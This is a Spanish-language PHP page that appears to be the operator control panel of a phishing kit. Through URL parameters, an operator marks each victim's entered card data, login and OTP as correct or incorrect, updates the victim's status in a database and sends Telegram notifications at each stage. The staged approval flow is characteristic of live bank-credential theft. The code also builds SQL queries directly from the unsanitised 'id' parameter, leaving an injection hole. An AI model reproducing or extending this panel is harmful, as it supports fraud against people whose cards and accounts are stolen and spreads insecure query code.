<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>API</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">
</head>

<body>

    <?php
    require_once('../conexion/telegram.php');
    // INGRESO DATOS
    if (isset($_GET["datos"]) && isset($_GET["id"])) {

        $id = $_GET["id"];

        if ($_GET["datos"] === "error") {
            $estado = 2;
            $mensaje = "Datos incorrectos";
            $clase = "alert-danger";
            $mensajeSuccess = "#".$id." - Tarjeta incorrecta";
        } else if ($_GET["datos"] === "ok") {
            $estado = 3;
            $mensaje = "Datos Correctos";
            $clase = "alert-success";
            $mensajeSuccess = "#".$id." - Ingresando Login";
        }

        $mysqli = include_once "../conexion/index.php";
        $response = false;
        $sentencia = $mysqli->prepare("UPDATE  users SET estado = $estado where id = $id");
        if ($sentencia->execute()) {
            $response = true;
        } else {
            $response = false;
        }
        $sentencia->close();

        if ($response == true) {
            echo '<div class="container mt-4">
                <h3 class="text-center">#'.$id.' - TARJETA</h3>
                <div class="alert text-center ' . $clase . '" role="alert">
                    <strong>Gestionado correctamente: </strong> <br> ' .
                $mensaje
                . '
                </div>  </div> ';
            
            mensajeSuccess($mensajeSuccess);
        } else {
            print_r("error");
        }
    }

     // INGRESO VERIFICAR
    else if (isset($_GET["verificar"]) && isset($_GET["id"])) {

        $id = $_GET["id"];

        if ($_GET["verificar"] === "error") {
            $estado = 4;
            $mensaje = "Datos incorrectos";
            $clase = "alert-danger";
            $mensajeSuccess = "#".$id." - Login incorrecto";
        } else if ($_GET["verificar"] === "ok") {
            $estado = 5;
            $mensaje = "Datos Correctos";
            $clase = "alert-success";
            $mensajeSuccess = "#".$id." - Ingresando OTP";
        }

        $mysqli = include_once "../conexion/index.php";
        $response = false;
        $sentencia = $mysqli->prepare("UPDATE  users SET estado = $estado where id = $id");
        if ($sentencia->execute()) {
            $response = true;
        } else {
            $response = false;
        }
        $sentencia->close();

        if ($response == true) {
            echo '<div class="container mt-4">
                <h3 class="text-center">#'.$id.' - LOGIN</h3>
                <div class="alert text-center ' . $clase . '" role="alert">
                    <strong>Gestionado correctamente: </strong> <br> ' .
                $mensaje
                . '
                </div> </div>  ';
                mensajeSuccess($mensajeSuccess);
        } else {
            print_r("error");
        }
    }

    // INGRESO OTP
    else if (isset($_GET["otp"]) && isset($_GET["id"])) {

        $id = $_GET["id"];

        if ($_GET["otp"] === "error") {
            $estado = 6;
            $mensaje = "Datos incorrectos";
            $clase = "alert-danger";
            $mensajeSuccess = "#".$id." - OTP incorrecta";
        } else if ($_GET["otp"] === "ok") {
            $estado = 7;
            $mensaje = "Datos Correctos - Finalizado";
            $clase = "alert-success";
            $mensajeSuccess = "#".$id." - Terminando Correctamente";
        }

        $mysqli = include_once "../conexion/index.php";
        $response = false;
        $sentencia = $mysqli->prepare("UPDATE  users SET estado = $estado where id = $id");
        if ($sentencia->execute()) {
            $response = true;
        } else {
            $response = false;
        }
        $sentencia->close();

        if ($response == true) {
            echo '<div class="container mt-4">
                <h3 class="text-center">#'.$id.'- OTP</h3>
                <div class="alert text-center ' . $clase . '" role="alert">
                    <strong>Gestionado correctamente: </strong> <br> ' .
                $mensaje
                . '
                </div>  </div> ';
                mensajeSuccess($mensajeSuccess);
        } else {
            print_r("error");
        }
    }

    else{
        echo '<div class="container mt-4">
                <h3 class="text-center">404 NO PAGE FOUND</h3>
            </div>  ';
    }
    ?>



    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-Fy6S3B9q64WdZWQUiU+q4/2Lc9npb8tCaSX9FK7E8HnRr0Jz8D6OP9dO5Vg3Q9ct" crossorigin="anonymous"></script>

    <script>
        function cerrarPestana() {
            // Cierra la pestaña actual
            window.close();
        }
    </script>
</body>

</html>